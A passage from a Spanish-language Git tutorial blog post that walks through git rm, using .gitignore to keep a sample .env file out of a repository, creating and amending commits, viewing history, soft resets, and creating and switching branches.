&lt;p&gt;De la misma forma que renombramos el archivo, podemos hacer lo mismo para eliminarlo. anteponiendo la palabra &lt;code&gt;git&lt;/code&gt; y seguido el comando &lt;code&gt;rm&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Para este caso vamos a eliminar el archivo que renombramos antes &lt;code&gt;archivo_modificado.txt&lt;/code&gt;, para ello como ya se encontraba en el &lt;code&gt;area de preparación&lt;/code&gt; debemos retirarla haciendo uso de los comandos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git restore --staged archivo_modificado.txt
git restore archivo_modificado.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una vez el arbol de trabajo este limpio, ejecutamos el comando &lt;code&gt;git rm&lt;/code&gt; y seguido el archivo que queremos eliminar. Visualizamos los cambios y vemos que nos agilizo el proceso ya que el archivo se encuentra en el &lt;code&gt;area de preparación&lt;/code&gt; y no fue necesario agregarlo ejecutando el &lt;code&gt;git add&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git rm archivo_modificado.txt
rm 'archivo_modificado.txt'
❯ git status
En la rama main
Cambios a ser confirmados:
  (usa &quot;git restore --staged &amp;lt;archivo&amp;gt;...&quot; para sacar del área de stage)
	borrados:        archivo_modificado.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;gitignore-ignorar-archivos-y-directorios&quot;&gt;Gitignore - Ignorar archivos y directorios &lt;a href=&quot;#gitignore-ignorar-archivos-y-directorios&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Si queremos ignorar archivos, que nunca se incluyan en nuestro repositorio y que solo sean especificos para nuestra máquina como son las variables de entorno.&lt;/p&gt;

&lt;p&gt;Supongamos que estamos trabajando con una &lt;code&gt;base de datos&lt;/code&gt; que tenemos instalada localmente, en este caso queremos que este archivo no se suba al repositorio, ya que no queremos que otras personas conozcan estos datos.&lt;/p&gt;

&lt;p&gt;Para ello vamos a crearnos un archivo al que llamaremos &lt;code&gt;.env&lt;/code&gt; que tendra de contenido unas supuestas credenciales.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat .env
user=firtsmiracle
password=12345
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora ejecuto &lt;code&gt;git status&lt;/code&gt; y nos aparece este archivo &lt;code&gt;.env&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
En la rama main
Archivos sin seguimiento:
  (usa &quot;git add &amp;lt;archivo&amp;gt;...&quot; para incluirlo a lo que se será confirmado)
	.env

no hay nada agregado al commit pero hay archivos sin seguimiento presentes (usa &quot;git add&quot; para hacerles seguimiento)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Pero yo no quiero que por error este archivo se agregue a incluir en un &lt;code&gt;commit&lt;/code&gt;, para ello debemos crear un archivo de nombre &lt;code&gt;.gitignore&lt;/code&gt; y en este archivo especificare cuales son los archivos o rutas de carpetas que quiero ignorar para que no vallan a nuestro repositorio.&lt;/p&gt;

&lt;p&gt;En este caso agregare dentro del archivo &lt;code&gt;.gitignore&lt;/code&gt; a nuestro archivo que contenia las credenciales &lt;code&gt;.env&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat .gitignore
.env
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y si ahora vuelvo a ejecutar el comando &lt;code&gt;git status&lt;/code&gt; el archivo &lt;code&gt;.env&lt;/code&gt; ya no aparece, solo aparece el archivo &lt;code&gt;.gitignore&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
En la rama main
Archivos sin seguimiento:
  (usa &quot;git add &amp;lt;archivo&amp;gt;...&quot; para incluirlo a lo que se será confirmado)
	.gitignore

no hay nada agregado al commit pero hay archivos sin seguimiento presentes (usa &quot;git add&quot; para hacerles seguimiento)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Entonces agregamos nuestro archivo &lt;code&gt;.gitignore&lt;/code&gt; con &lt;code&gt;git add&lt;/code&gt; y verificamos&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git add .gitignore
❯ git status
En la rama main
Cambios a ser confirmados:
  (usa &quot;git restore --staged &amp;lt;archivo&amp;gt;...&quot; para sacar del área de stage)
	nuevos archivos: .gitignore
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;De esta manera todo lo que incluyamos dentro del archivo &lt;code&gt;.gitignore&lt;/code&gt; no sera agregado por ningun motivo al repositorio.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Un pequeño tip final es que con el comando &lt;code&gt;git status -s&lt;/code&gt;, podemos ver el estado en el que se encuentra cada archivo de manera simplificada.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status -s
A  .gitignore
D archivo_modificado.txt
?? archivo_cambiado.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Donde &lt;code&gt;A&lt;/code&gt; seria agregado, &lt;code&gt;D&lt;/code&gt; borrado y cuando vemos &lt;code&gt;??&lt;/code&gt; quiere decir que el archivo aun no tiene un seguimiento.&lt;/p&gt;

&lt;h2 id=&quot;creación-de-un-commit&quot;&gt;Creación de un Commit &lt;a href=&quot;#creación-de-un-commit&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Antes de crear nuestro primer &lt;code&gt;commit&lt;/code&gt;, debemos recordar que un &lt;code&gt;commit&lt;/code&gt; viene a ser un registro o foto del estado de nuestro proyecto en un momento especifico. Registra los cambios realizados en los archivos en comparación con la versión anterior.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/commits.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Cada vez que creeemos un &lt;code&gt;commit&lt;/code&gt; debemos agregarle una descripción segun la acción o los cambios que hayamos realizado esto es muy importante para saber con detalle a traves del tiempo las modificaciones que se realizaron en el proyecto.&lt;/p&gt;

&lt;p&gt;Ahora comenzemos a crear nuestro &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Anteriormente cuando ejecutamos &lt;code&gt;git status&lt;/code&gt;, veiamos que habian cambios que estan listos para ser agregados del &lt;code&gt;area de preparación&lt;/code&gt; a al repositorio &lt;code&gt;.git&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
En la rama main

No hay commits todavía

Cambios a ser confirmados:
  (usa &quot;git rm --cached &amp;lt;archivo&amp;gt;...&quot; para sacar del área de stage)
	nuevos archivos: archivo_git.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo siguiente seria agregar un &lt;code&gt;commit&lt;/code&gt;, esto lo hacemos con el comando &lt;code&gt;git commit&lt;/code&gt; y seguidamente con &lt;code&gt;-m&lt;/code&gt; agregamos una descripción.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git commit -m &quot;agregar mi archivo de texto&quot;
[main (commit-raíz) 0143452] agregar mi archivo de texto
 1 file changed, 1 insertion(+)
 create mode 100644 archivo_git.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Se nos muestra información del &lt;code&gt;commit&lt;/code&gt;, como su identificador &lt;code&gt;0143452&lt;/code&gt;, la descripción y hubo una modificación en conjunto con una inserción que significa que se agrego una linea al archivo.&lt;/p&gt;

&lt;h2 id=&quot;estructura-del-commit&quot;&gt;Estructura del Commit &lt;a href=&quot;#estructura-del-commit&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;La estructura de un&lt;code&gt;commit&lt;/code&gt; se compone de varias partes, esto lo observamos al ejecutar el comando &lt;code&gt;git log&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git log
commit 0143452c010ede2332f5c1b8bad7815743770a2a (HEAD -&amp;gt; main)
Author: Firtsmiracle &amp;lt;firtsmiracle@hotmail.com&amp;gt;
Date:   Mon Apr 10 18:43:50 2023 +0000

    agregar mi archivo de texto
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos observar inicialmente una serie de numeros alfanumericos que corresponde a un identificador unico llamado &lt;code&gt;SHA&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;SHA: Scure Hash Algorith o Algoritmo de hash seguro&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;este &lt;code&gt;SHA&lt;/code&gt; identifica:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Los cambios realizados&lt;/li&gt;
  &lt;li&gt;Dónde se realizaron los cambios&lt;/li&gt;
  &lt;li&gt;Quién realizo los cambios&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Seguidamente el &lt;code&gt;commit&lt;/code&gt; contiene el nombre del &lt;code&gt;usuario&lt;/code&gt; en conjunto con el &lt;code&gt;correo&lt;/code&gt; asignado &lt;code&gt;Author: Firtsmiracle &amp;lt;firtsmiracle@hotmail.com&amp;gt;&lt;/code&gt;; tambien podemos observar la fecha de creación del &lt;code&gt;commit&lt;/code&gt; que corresponde a &lt;code&gt;Date:   Mon Apr 10 18:43:50 2023 +0000&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Finalmente en la ultima parte podemos ver la descripción que agregamos al crear nuestro &lt;code&gt;commit&lt;/code&gt; -&amp;gt; &lt;code&gt;agregar mi archivo de texto&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;historial-de-commits&quot;&gt;Historial de Commits &lt;a href=&quot;#historial-de-commits&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Si queremos ver el registro de nuestros &lt;code&gt;commits&lt;/code&gt;, podemos usar el comando &lt;code&gt;git log&lt;/code&gt; el cual nos mostrara el historial de todos los &lt;code&gt;commits&lt;/code&gt; que hayamos creado.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git log
commit 0143452c010ede2332f5c1b8bad7815743770a2a (HEAD -&amp;gt; main)
Author: Firtsmiracle &amp;lt;firtsmiracle@hotmail.com&amp;gt;
Date:   Mon Apr 10 18:43:50 2023 +0000

    agregar mi archivo de texto
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como vimos anteriormente vemos el &lt;code&gt;commit&lt;/code&gt; con su estructura; cabe resaltar que si creamos mas &lt;code&gt;commits&lt;/code&gt; con este comandos los veremos todos.&lt;/p&gt;

&lt;h2 id=&quot;creación-alterna-de-commits&quot;&gt;Creación Alterna de Commits &lt;a href=&quot;#creación-alterna-de-commits&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Supongamos que editamos el archivo que tenemos &lt;code&gt;archivo_git.txt&lt;/code&gt; y le cambiamos el contenido&lt;/p&gt;

&lt;p&gt;El cual cambiaremos de este contenido:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
Este es mi primer repositorio
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;a este nuevo&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
Este es mi segundo commit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si ejecutamos &lt;code&gt;git status&lt;/code&gt; vemos que tenemos un archivo en estado &lt;code&gt;modificado&lt;/code&gt; y que hay cambios no rastreados para el proximo &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
En la rama main
Cambios no rastreados para el commit:
  (usa &quot;git add &amp;lt;archivo&amp;gt;...&quot; para actualizar lo que será confirmado)
  (usa &quot;git restore &amp;lt;archivo&amp;gt;...&quot; para descartar los cambios en el directorio de trabajo)
	modificados:     archivo_git.txt

sin cambios agregados al commit (usa &quot;git add&quot; y/o &quot;git commit -a&quot;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para agregar los cambios entonces debemos ejecutar &lt;code&gt;git add&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git add archivo_git.txt
❯ git status
En la rama main
Cambios a ser confirmados:
  (usa &quot;git restore --staged &amp;lt;archivo&amp;gt;...&quot; para sacar del área de stage)
	modificados:     archivo_git.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora que el archivo esta lista para agregarse al &lt;code&gt;commit&lt;/code&gt;, procerederemos a crearlo&lt;/p&gt;

&lt;p&gt;Esta vez ejecutaremos unicamente el comando &lt;code&gt;git commit&lt;/code&gt; sin ningun parametro adiocional, lo que hara que se nos abra el editor de texto donde podremos insertar la descripción ddel &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Generalmente se nos abrira el editor por defecto en nuestro sistema en nuestro caso por defecto se abrira en &lt;code&gt;vim&lt;/code&gt; o &lt;code&gt;nano&lt;/code&gt;, pero si deseamos podemos configurar el editor apra que inicie con otro con el que trabajemos mas comodo.&lt;/p&gt;

&lt;p&gt;Para ello hay varias opciones independientemente si nos encontramos en &lt;code&gt;Linux&lt;/code&gt; o en &lt;code&gt;Windows&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Para &lt;code&gt;Linux&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;Si queremos usar &lt;code&gt;Visual Studio Code&lt;/code&gt; ejecutar:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ git config --global core.editor &quot;code --wait&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si queremos usar &lt;code&gt;Sublime Text&lt;/code&gt; ejecutar:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ git config --global core.editor &quot;subl -n -w&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si queremos usar &lt;code&gt;emacs&lt;/code&gt; ejecutar:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;git config --global core.editor emacs
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para &lt;code&gt;Windows&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;Si queremos usar &lt;code&gt;Visual Studio Code&lt;/code&gt; ejecutar:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ git config --global core.editor &quot;code --wait&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si queremos usar &lt;code&gt;Sublime Text&lt;/code&gt; ejecutar:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ git config --global core.editor &quot;'C:/Program Files (x86)/sublime text 3/subl.exe' -w&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si queremos usar &lt;code&gt;Notepad++&lt;/code&gt; ejecutar:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ git config --global core.editor &quot;'C:/Program Files (x86)/Notepad++/notepad++.exe' -multiInst -notabbar -nosession -noPlugin&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Entonces una vez tengamos configurado nuestro editor procedemos a ejecutar &lt;code&gt;git commit&lt;/code&gt; y se procedera a abrirnos nuestro editor de texto. Tal y como nos indicar podemos agregar un mensaje del &lt;code&gt;commit&lt;/code&gt; en una linea sin comentar y guardamos los cambios, pero si deseamos cancelar la operación simplemente el mensaje tiene que estar vacio.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;
# Por favor ingresa el mensaje del commit para tus cambios. Las
#  líneas que comiencen con '#' serán ignoradas, y un mensaje
#  vacío aborta el commit.
#
# En la rama main
# Cambios a ser confirmados:
#	modificados:     archivo_git.txt
#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Entonces vamos a agregar un mensaje para el &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Cambiar texto a segundo commit
# Por favor ingresa el mensaje del commit para tus cambios. Las
#  líneas que comiencen con '#' serán ignoradas, y un mensaje
#  vacío aborta el commit.
#
# En la rama main
# Cambios a ser confirmados:
#	modificados:     archivo_git.txt
#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y automaticamente al guardar y cerrar el archivo, procede a crearse el &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git commit
[main bb00766] Cambiar texto a segundo commit
 1 file changed, 1 insertion(+), 1 deletion(-)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora podemos volver a ver el historial de &lt;code&gt;commits&lt;/code&gt; usando &lt;code&gt;git log&lt;/code&gt; y esta vez vemos los dos &lt;code&gt;commits&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git log
commit bb007665d2356b9531ce10be913fd26a27e757da (HEAD -&amp;gt; main)
Author: Firtsmiracle &amp;lt;firtsmiracle@hotmail.com&amp;gt;
Date:   Mon Apr 10 20:13:55 2023 +0000

    Cambiar texto a segundo commit

commit 0143452c010ede2332f5c1b8bad7815743770a2a
Author: Firtsmiracle &amp;lt;firtsmiracle@hotmail.com&amp;gt;
Date:   Mon Apr 10 18:43:50 2023 +0000

    agregar mi archivo de texto
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;cambiar-descripción-del-commit&quot;&gt;Cambiar Descripción del Commit &lt;a href=&quot;#cambiar-descripción-del-commit&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Supongamos que creamos un &lt;code&gt;commit&lt;/code&gt;, pero vimos que pudimos tener un error de tipeo o el mensaje no es muy descriptivo. Pues podemos modificar el ultimo &lt;code&gt;commit&lt;/code&gt; usando el comando &lt;code&gt;git commit --amend&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git commit --amend
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Al ejecutar se nos vuelve a abrir el editor de texto con la descripción que habiamos ingresado&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Cambiar texto a segundo commit

# Por favor ingresa el mensaje del commit para tus cambios. Las
#  líneas que comiencen con '#' serán ignoradas, y un mensaje
#  vacío aborta el commit.
#
# Fecha:     Mon Apr 10 20:13:55 2023 +0000
#
# En la rama main
# Cambios a ser confirmados:
#	modificados:     archivo_git.txt
#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para modificarlo solo debemos modificar el mensaje, guardar y cerrar el archivo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Cambiar el contenido de mi commit

# Por favor ingresa el mensaje del commit para tus cambios. Las
#  líneas que comiencen con '#' serán ignoradas, y un mensaje
#  vacío aborta el commit.
#
# Fecha:     Mon Apr 10 20:13:55 2023 +0000
#
# En la rama main
# Cambios a ser confirmados:
#	modificados:     archivo_git.txt
#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Regresamos a donde ejecutamos el comando y vemos que se actualizo correctamente.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git commit --amend
[main 222c488] Cambiar el contenido de mi commit
 Date: Mon Apr 10 20:13:55 2023 +0000
 1 file changed, 1 insertion(+), 1 deletion(-)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para verificar que se actualizo el &lt;code&gt;commit&lt;/code&gt; en el historial usamos &lt;code&gt;git log&lt;/code&gt;, pero esta vez agregaremos el parametro &lt;code&gt;--oneline&lt;/code&gt; para acortar la información mostrada.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git log --oneline
222c488 (HEAD -&amp;gt; main) Cambiar el contenido de mi commit
0143452 agregar mi archivo de texto
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y vemos que fue modificado con exito.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Es importante saber que si vamos a ejecutar el comando &lt;code&gt;git commit --amend&lt;/code&gt; lo hagamos en nuestro &lt;code&gt;repositorio local&lt;/code&gt; no en uno remoto ya que puede ser riesgoso si lo hacemos en proyectos que ya estan siendo usados por otros desarrolladores.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Como consejo hay que tratar siempre de ingresar la descripción o mensaje correcto al &lt;code&gt;commit&lt;/code&gt; para evitar realizar este proceso&lt;/p&gt;

&lt;h2 id=&quot;revertir-commits&quot;&gt;Revertir Commits &lt;a href=&quot;#revertir-commits&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Suele pasar en ocasiones cuando estamos trabajando en algun proyecto y al crear un &lt;code&gt;commit&lt;/code&gt; nos damos cuenta de que nos faltaba agregar algo. Si queremos revertir los cambios hechos por un &lt;code&gt;commit&lt;/code&gt;, podemos hacerlo de forma tal que no se afecten los archivos.&lt;/p&gt;

&lt;p&gt;Para realizar esto el comando que debemos ejecutar es &lt;code&gt;git reset --soft HEAD~1&lt;/code&gt;, donde con el parametro &lt;code&gt;soft&lt;/code&gt; podemos reiniciarlo de modo que los archivos no se modifiquen en el directorio de trabajo. Solo se va a deshacer el registro del &lt;code&gt;commit&lt;/code&gt;, en este caso con &lt;code&gt;HEAD~1&lt;/code&gt; indicaremos al ultimo &lt;code&gt;commit&lt;/code&gt; que se realizo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git reset --soft HEAD~1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una vez ejecutamos el comando, visiblemente no vemos ningun cambio, pero si volvemos a ver el historial de &lt;code&gt;commits&lt;/code&gt;, solo vemos el primer &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git log
commit 0143452c010ede2332f5c1b8bad7815743770a2a (HEAD -&amp;gt; main)
Author: Firtsmiracle &amp;lt;firtsmiracle@hotmail.com&amp;gt;
Date:   Mon Apr 10 18:43:50 2023 +0000

    agregar mi archivo de texto
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y si volvemos a leer el archivo, aún mantiene el contenido con los cambios que habiamos realizado&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
Este es mi segundo commit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pero que pasa si volvemos a modificar el archivo&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
Este es mi segundo commit pero modificado
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;º
y volvemos a ejecutar &lt;code&gt;git status&lt;/code&gt;, vemos cambios listos para ser agregados y otros que aun no estan listos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
En la rama main
Cambios a ser confirmados:
  (usa &quot;git restore --staged &amp;lt;archivo&amp;gt;...&quot; para sacar del área de stage)
	modificados:     archivo_git.txt

Cambios no rastreados para el commit:
  (usa &quot;git add &amp;lt;archivo&amp;gt;...&quot; para actualizar lo que será confirmado)
  (usa &quot;git restore &amp;lt;archivo&amp;gt;...&quot; para descartar los cambios en el directorio de trabajo)
	modificados:     archivo_git.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como deshicimos el ultimo &lt;code&gt;commit&lt;/code&gt; lo que quiere decir que el cambio a de ese ultimo &lt;code&gt;commit&lt;/code&gt; que borramos, aún no es parte del repositorio. Para agregar todos esos cambios lo que podemos hacer es ejecutar el comando &lt;code&gt;git add .&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Con &lt;code&gt;git add .&lt;/code&gt; podemos agregar todos los cambios al &lt;code&gt;area de preparación&lt;/code&gt;, sin necesidad de ejecutar cada archivo.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git add .
❯ git status
En la rama main
Cambios a ser confirmados:
  (usa &quot;git restore --staged &amp;lt;archivo&amp;gt;...&quot; para sacar del área de stage)
	modificados:     archivo_git.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora si queremos crear este &lt;code&gt;commit&lt;/code&gt;, volvemos a ejecutar &lt;code&gt;git commit&lt;/code&gt; y asignamos un mensaje mas especifico&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Actualizar teto del segundo commit modificado
# Por favor ingresa el mensaje del commit para tus cambios. Las
#  líneas que comiencen con '#' serán ignoradas, y un mensaje
#  vacío aborta el commit.
#
# En la rama main
# Cambios a ser confirmados:
#	modificados:     archivo_git.txt
#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Guardamos y cerramos y ya tendriamos creado este nuevo &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git commit
[main 415796f] Actualizar teto del segundo commit modificado
 1 file changed, 1 insertion(+), 1 deletion(-)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;branch-ramas&quot;&gt;Branch - Ramas &lt;a href=&quot;#branch-ramas&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Un &lt;code&gt;branch&lt;/code&gt; es una linea independiente de desarrollo en el repositorio, gracias a estas podemos tener copias del &lt;code&gt;branch&lt;/code&gt; principal y que estas vallan evolucionando o cambiando independientemente sin afectar al &lt;code&gt;branch&lt;/code&gt; principal.&lt;/p&gt;

&lt;p&gt;El concepto es similar a las ramas de un arbol, donde tenemos como branch o rama principal &lt;code&gt;main&lt;/code&gt; o &lt;code&gt;master&lt;/code&gt; y desde ahi podemos crear otras subramas que en algun  momento si queremos podemos convinar.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/ramas.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Supongamos que tenemos una linea actual del proyecto, pero queremos agregarle nuevas funcionalidades como una nueva sección o cambiar algo para ver su funcionamiento. Pues si creamos un nuevo &lt;code&gt;branch&lt;/code&gt; podemos realizar nuestros cambios sin afectar la versión que actualmente este activo.&lt;/p&gt;

&lt;p&gt;Una vez que el &lt;code&gt;branch&lt;/code&gt; alterno a evolucionado con todos los cambios correspondientes, podemos combinarla con el &lt;code&gt;branch&lt;/code&gt; principal.&lt;/p&gt;

&lt;h3 id=&quot;creación-de-un-branch&quot;&gt;Creación de un Branch &lt;a href=&quot;#creación-de-un-branch&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Para poder crear un nuevo &lt;code&gt;branch&lt;/code&gt; debemos ejecutar el comando &lt;code&gt;git branch&lt;/code&gt; y seguidamente el nombre de la rama que queremos crear&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch primer-branch-alterno
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;y ahora para visualizar los &lt;code&gt;branch&lt;/code&gt; que tenemos usamos unicamente el comando &lt;code&gt;git branch&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch
* main
  primer-branch-alterno
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;El comandos nos muestra que ahora tenemos dos &lt;code&gt;branch&lt;/code&gt;, el principal que teniamos &lt;code&gt;main&lt;/code&gt; y ahora el nuevo que creamos &lt;code&gt;primer-branch-alterno&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;moverse-de-branch&quot;&gt;Moverse de Branch &lt;a href=&quot;#moverse-de-branch&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Si queremos desplazarnos de un &lt;code&gt;branch&lt;/code&gt; a otro debemos ejecutar el comando &lt;code&gt;git checkout&lt;/code&gt; y seguido el nombre del &lt;code&gt;branch&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git checkout primer-branch-alterno
Cambiado a rama 'primer-branch-alterno'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para confirmar que nos cambiamos a ese nuevo &lt;code&gt;branch&lt;/code&gt; volvemos a ejecutar &lt;code&gt;git branch&lt;/code&gt; y esta vez nos selecciona el &lt;code&gt;branch&lt;/code&gt; alterno&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch
  main
* primer-branch-alterno
&lt;/code&gt;&lt;/pre&gt;

